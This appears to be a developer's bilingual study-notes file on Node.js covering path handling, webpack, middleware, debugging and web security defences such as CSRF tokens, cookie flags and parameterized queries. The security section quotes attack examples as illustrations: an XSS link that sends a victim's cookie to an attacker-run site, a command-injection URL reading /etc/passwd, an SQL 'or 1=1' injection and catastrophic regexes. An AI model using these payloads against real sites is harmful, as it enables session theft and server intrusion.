/*Node 中的文件路径大概有 __dirname, __filename, process.cwd(), ./ 或者 ../，前三个都是绝对路径，为了便于比较，./ 和 ../ 我们通过 path.resolve('./')来转换为绝对路径。
__dirname: 总是返回被执行的 js 所在文件夹的绝对路径
__filename: 总是返回被执行的 js 的绝对路径
process.cwd(): 总是返回运行 node 命令时所在的文件夹的绝对路径

关于 ./ 正确的结论是：

在 require() 中使用是跟 __dirname 的效果相同，不会因为启动脚本的目录不一样而改变，在其他情况下跟 process.cwd() 效果相同，是相对于启动脚本所在目录的路径。


0.webpack config
output.publicPath
这个是html引用资源时候的路径
This option specifies the public URL of the output directory when referenced in a browser. A relative URL is resolved relative to the HTML page (or <base> tag). Server-relative URLs, protocol-relative URLs or absolute URLs are also possible and sometimes required, i. e. when hosting assets on a CDN.


/*From a developer's point of view Node.js is single-threaded - but under the hood libuv handles threading, file system events, implements the event loop, features thread pooling and so on. In most cases you won't interact with it directly.

1.pros of nodejs:
fe and be语言一致
Node.js is the perfect tool for developing high-throughput server-side applications.
npm packages

You did a great job of summarizing what's awesome about Node.js. My feeling is that Node.js is especially suited for applications where you'd like to maintain a persistent connection from the browser back to the server. Using a technique known as "long-polling", you can write an application that sends updates to the user in real time. Doing long polling on many of the web's giants, like Ruby on Rails or Django, would create immense load on the server, because each active client eats up one server process. This situation amounts to a tarpit attack. When you use something like Node.js, the server has no need of maintaining separate threads for each open connection.

This means you can create a browser-based chat application in Node.js that takes almost no system resources to serve a great many clients. Any time you want to do this sort of long-polling, Node.js is a great option.

It's worth mentioning that Ruby and Python both have tools to do this sort of thing (eventmachine and twisted, respectively), but that Node.js does it exceptionally well, and from the ground up. JavaScript is exceptionally well situated to a callback-based concurrency model, and it excels here. Also, being able to serialize and deserialize with JSON native to both the client and the server is pretty nifty.

I look forward to reading other answers here, this is a fantastic question.

It's worth pointing out that Node.js is also great for situations in which you'll be reusing a lot of code across the client/server gap. The Meteor framework makes this really easy, and a lot of folks are suggesting this might be the future of web development. I can say from experience that it's a whole lot of fun to write code in Meteor, and a big part of this is spending less time thinking about how you're going to restructure your data, so the code that runs in the browser can easily manipulate it and pass it back.

Here's an article on Pyramid and long-polling, which turns out to be very easy to set up with a little help from gevent: TicTacToe and Long Polling with Pyramid.


 In general, any CPU intensive operation annuls all the throughput benefits Node offers with its event-driven, non-blocking I/O model because any incoming requests will be blocked while the thread is occupied with your number-crunching.


2.security
Security HTTP Headers
There are some security-related HTTP headers that your site should set. These headers are:

Strict-Transport-Security enforces secure (HTTP over SSL/TLS) connections to the server
X-Frame-Options provides clickjacking protection
X-XSS-Protection enables the Cross-site scripting (XSS) filter built into most recent web browsers
X-Content-Type-Options prevents browsers from MIME-sniffing a response away from the declared content-type
Content-Security-Policy prevents a wide range of attacks, including Cross-site scripting and other cross-site injections


Authentication
Brute Force Protection
you can use the ratelimiter package

Session Management

The importance of secure use of cookies cannot be understated: especially within dynamic web applications, which need to maintain state across a stateless protocol such as HTTP.

Cookie Flags

The following is a list of the attributes that can be set for each cookie and what they mean:

secure - this attribute tells the browser to only send the cookie if the request is being sent over HTTPS.
HttpOnly - this attribute is used to help prevent attacks such as cross-site scripting, since it does not allow the cookie to be accessed via JavaScript.
Cookie Scope

domain - this attribute is used to compare against the domain of the server in which the URL is being requested. If the domain matches or if it is a sub-domain, then the path attribute will be checked next.
path - in addition to the domain, the URL path that the cookie is valid for can be specified. If the domain and path match, then the cookie will be sent in the request.
expires - this attribute is used to set persistent cookies, since the cookie does not expire until the set date is exceeded
*/

var cookieSession = require('cookie-session');
var express = require('express');
 
var app = express();
 
app.use(cookieSession({
  name: 'session',
  keys: [
    process.env.COOKIE_KEY1,
    process.env.COOKIE_KEY2
  ]
}));
 
app.use(function (req, res, next) {
  var n = req.session.views || 0;
  req.session.views = n++;
  res.end(n + ' views');
});
 
app.listen(3000);



/*csrf
Cross-Site Request Forgery is an attack that forces a user to execute unwanted actions on a web application in which they're currently logged in. These attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.

*/
var cookieParser = require('cookie-parser');
var csrf = require('csurf');
var bodyParser = require('body-parser');
var express = require('express');
 
// setup route middlewares 
var csrfProtection = csrf({ cookie: true });
var parseForm = bodyParser.urlencoded({ extended: false });
 
// create express app 
var app = express();
 
// we need this because "cookie" is true in csrfProtection 
app.use(cookieParser());
 
app.get('/form', csrfProtection, function(req, res) {
  // pass the csrfToken to the view 
  res.render('send', { csrfToken: req.csrfToken() });
});
 
app.post('/process', parseForm, csrfProtection, function(req, res) {
  res.send('data is being processed');
});

//While on the view layer you have to use the CSRF token like this:

<form action="/process" method="POST">
    <input type="hidden" name="_csrf" value="{{csrfToken}}" />

    Favorite color<input type="text" name="favoriteColor" />
    <button type="submit">Submit</button>
</form>

/* Data Validation
XSS
我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功

反射型：诱使用户点起链接，url里面注入恶意js脚本

Reflected Cross site scripting occurs when the attacker injects executable JavaScript code into the HTML response with specially crafted links.

存储型：存储没有过滤的用户输入，用户输入注入恶意js脚本，存储到服务端
对用户输入进行过滤，转码< > & " () 大于0x80的ASCII
在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码


To defend against these kind of attacks make sure that you always filter/sanitize user input.

SQL Injection

SQL injection consists of injection of a partial or complete SQL query via user input. It can read sensitive information or be destructive as well.

Take the following example:

select title, author from books where id=$id
In this example $id is coming from the user - what if the user enters 2 or 1=1? The query becomes the following:

select title, author from books where id=2 or 1=1
The easiest way to defend against these kind of attacks is to use parameterized queries or prepared statements.

If you are using PostgreSQL from Node.js then you probably using the node-postgres module. To create a parameterized query all you need to do is:

var q = 'SELECT name FROM books WHERE id = $1';
client.query(q, ['3'], function(err, result) {});
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. Use this tool to test your applications for SQL injection vulnerabilities.

Command Injection

Command injection is an technique used by an attacker to run OS commands on the remote web server. With this approach an attacker might even get passwords to the system.

In practice, if you have a URL like:

https://example.com/downloads?file=user1.txt
it could be turn into:

https://example.com/downloads?file=%3Bcat%20/etc/passwd
In this example %3B becomes the semicolon, so multiple OS commands can be run.

To defend against these kind of attacks make sure that you always filter/sanitize user input.

Also, speaking of Node.js:

child_process.exec('ls', function (err, data) {  
    console.log(data);
});
Under the hood child_process.exec makes a call to execute /bin/sh, so it is a bash interpreter and not a program launcher.

This is problematic when user input is passed to this method - can be either a backtick or $(), a new command can be injected by the attacker.

To overcome this issue simply use child_process.execFile.

Secure Transmission

SSL Version, Algorithms, Key length

As HTTP is a clear-text protocol it must be secured via SSL/TLS tunnel, known as HTTPS. Nowadays high grade ciphers are normally used, misconfiguration in the server can be used to force the use of a weak cipher - or at worst no encryption.

You have to test:

ciphers, keys and renegotiation is properly configured
certificate validity
Using the tool nmap and sslyze the job is quite easy.

Regular Expression

This kind of attack exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly. These Regexes are called Evil Regexes:

Grouping with repetition
Inside the repeated group
Repetition
Alternation with overlapping
([a-zA-Z]+)*, (a+)+ or (a|a?)+ are all vulnerable Regexes as a simple input like aaaaaaaaaaaaaaaaaaaaaaaa! can cause heavy computations. 

3. middleware
Express (http://expressjs.com) popularized the term middleware in the  
Node.js world, binding it to a very specific design pattern. In express, in fact,  
a middleware represents a set of services, typically functions, that are organized  
in a pipeline and are responsible for processing incoming HTTP requests and  
relative responses. 

如果把一个http处理过程比作是污水处理，中间件就像是一层层的过滤网。每个中间件在http处理过程中通过改写request或（和）response的数据、状态，实现了特定的功能。
Middleware allows you to define a stack of actions that you should flow through. Express servers themselves are a stack of middlewares.
中间件函数可以执行以下任务：

执行任何代码。
对请求和响应对象进行更改。
结束请求/响应循环。
调用堆栈中的下一个中间件函数。
如果当前中间件函数没有结束请求/响应循环，那么它必须调用 next()，以将控制权传递给下一个中间件函数。否则，请求将保持挂起状态。

 Today, in Node.js, the word middleware is used well 
beyond the boundaries of the express framework, and indicates a particular pattern 
whereby a set of processing units, filters, and handlers, under the form of functions are 
connected to form an asynchronous sequence in order to perform preprocessing and 
postprocessing of any kind of data. The main advantage of this pattern is flexibility; in 
fact, this pattern allows us to obtain a plugin infrastructure with incredibly little effort, 
providing an unobtrusive way for extending a system with new filters and handlers.

The essential component of the pattern is the Middleware Manager, which is 
responsible for organizing and executing the middleware functions. The most 
important implementation details of the pattern are as follows:
•    New middleware can be registered by invoking the use() function  
(the name of this function is a common convention in many implementations 
of this pattern, but we can choose any name). Usually, new middleware can 
only be appended at the end of the pipeline, but this is not a strict rule.
•    When new data to process is received, the registered middleware is invoked in an asynchronous sequential execution flow. Each unit in the pipeline 
receives in input the result of the execution of the previous unit.
•    Each middleware can decide to stop further processing of the data by simply 
not invoking its callback or by passing an error to the callback. An error 
situation usually triggers the execution of another sequence of middleware 
that is specifically dedicated to handling errors.



4.debug nodejs 加上node --inspect-brk index.js

https://nodejs.org/en/docs/guides/debugging-getting-started/
